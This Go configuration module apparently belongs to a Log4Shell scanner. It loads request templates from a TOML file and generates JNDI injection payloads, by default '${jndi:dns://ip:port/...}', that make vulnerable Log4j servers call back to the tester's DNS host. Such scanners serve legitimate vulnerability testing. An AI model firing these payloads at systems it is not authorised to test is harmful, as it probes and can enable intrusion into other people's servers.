package conf

import (
	"fmt"
	"math/rand"
	"net/url"
	"os"
	"strconv"
	"strings"
	"time"

	"github.com/BurntSushi/toml"
)

type Request struct {
	Path    string
	Method  string
	Header  []string
	Body    []string
	Header1 map[string]string
	Name    string
	Payload string
	Body1   string
}

type Ceyeinfo struct {
	Domain string
	Token  string
}

type Config struct {
	DefaultPoc     bool
	DefaultPayload string
	UseDnsLog      bool
	Request        []Request
	Ceye           Ceyeinfo
}

var Conf Config
var DefaultPoc bool
var Rand string

func ReadConf() string {
	f := "conf.toml"
	if _, err := os.Stat(f); err != nil {
		fmt.Println("conf.toml 文件不不存在！")
		os.Exit(1)
	}
	return f
}

func init() {
	f := ReadConf()

	_, err := toml.DecodeFile(f, &Conf)
	if err != nil {
		fmt.Println("初始化失败! err:" + err.Error())
		os.Exit(1)
	}

	DefaultPoc = Conf.DefaultPoc

	for k, s := range Conf.Request {
		Conf.Request[k].Header1 = make(map[string]string)
		for _, ss := range s.Header {
			s1 := strings.Split(ss, ":")
			Conf.Request[k].Header1[s1[0]] = s1[1]
		}

		for _, ss := range s.Body {
			Conf.Request[k].Body1 += ss
		}
	}

	if Conf.UseDnsLog {
		rand.Seed(time.Now().Unix())
		Rand = strconv.Itoa(rand.Intn(1000))
	}
}

func GeneratePayload(ip, port, num1, num2 string, k int) (payload string) {
	var DefaultPayload string
	if Conf.DefaultPayload == "" {
		DefaultPayload = fmt.Sprintf("${jndi:dns://%s:%s/%s/%s}", ip, port, num1, num2)
		payload = Conf.Request[k].Payload
		if payload == "" {
			return DefaultPayload
		} else {
			if strings.Contains(payload, "*ip*") && strings.Contains(payload, "*port*") {
				if strings.Contains(payload, "<#>") || strings.Contains(payload, "<#*>") || strings.Contains(payload, "<#**>") {
					payload = strings.Replace(payload, "*ip*", ip, 1)
					payload = strings.Replace(payload, "*port*", port, 1)
					if strings.Contains(payload, "<#**>") {
						payload = strings.Replace(payload, "<#**>", url.QueryEscape(url.QueryEscape("/"))+num1+url.QueryEscape(url.QueryEscape("/"))+num2, 1)
					}
					if strings.Contains(payload, "<#*>") {
						payload = strings.Replace(payload, "<#*>", url.QueryEscape("/")+num1+url.QueryEscape("/")+num2, 1)
					}
					if strings.Contains(payload, "<#>") {
						payload = strings.Replace(payload, "<#>", "/"+num1+"/"+num2, 1)
					}
				}
			}
			DefaultPayload = payload
		}
		return DefaultPayload
	} else {
		if strings.Contains(Conf.DefaultPayload, "*ip*") && strings.Contains(Conf.DefaultPayload, "*port*") {
			if strings.Contains(Conf.DefaultPayload, "<#>") || strings.Contains(Conf.DefaultPayload, "<#*>") || strings.Contains(Conf.DefaultPayload, "<#**>") {
				DefaultPayload = strings.Replace(Conf.DefaultPayload, "*ip*", ip, 1)
				DefaultPayload = strings.Replace(DefaultPayload, "*port*", port, 1)
				if strings.Contains(Conf.DefaultPayload, "<#**>") {
					DefaultPayload = strings.Replace(DefaultPayload, "<#**>", url.QueryEscape(url.QueryEscape("/"))+num1+url.QueryEscape(url.QueryEscape("/"))+num2, 1)
				}
				if strings.Contains(Conf.DefaultPayload, "<#*>") {
					DefaultPayload = strings.Replace(DefaultPayload, "<#*>", url.QueryEscape("/")+num1+url.QueryEscape("/")+num2, 1)
				}
				if strings.Contains(Conf.DefaultPayload, "<#>") {
					DefaultPayload = strings.Replace(DefaultPayload, "<#>", "/"+num1+"/"+num2, 1)
				}
			}
		}
		payload = Conf.Request[k].Payload
		if payload == "" {
			return DefaultPayload
		} else {
			if strings.Contains(payload, "*ip*") && strings.Contains(payload, "*port*") {
				if strings.Contains(payload, "<#>") || strings.Contains(payload, "<#*>") || strings.Contains(payload, "<#**>") {
					payload = strings.Replace(payload, "*ip*", ip, 1)
					payload = strings.Replace(payload, "*port*", port, 1)
					if strings.Contains(payload, "<#**>") {
						payload = strings.Replace(payload, "<#**>", url.QueryEscape(url.QueryEscape("/"))+num1+url.QueryEscape(url.QueryEscape("/"))+num2, 1)
					}
					if strings.Contains(payload, "<#*>") {
						payload = strings.Replace(payload, "<#*>", url.QueryEscape("/")+num1+url.QueryEscape("/")+num2, 1)
					}
					if strings.Contains(payload, "<#>") {
						payload = strings.Replace(payload, "<#>", "/"+num1+"/"+num2, 1)
					}
				}
			}
			DefaultPayload = payload
		}
		return DefaultPayload
	}
}
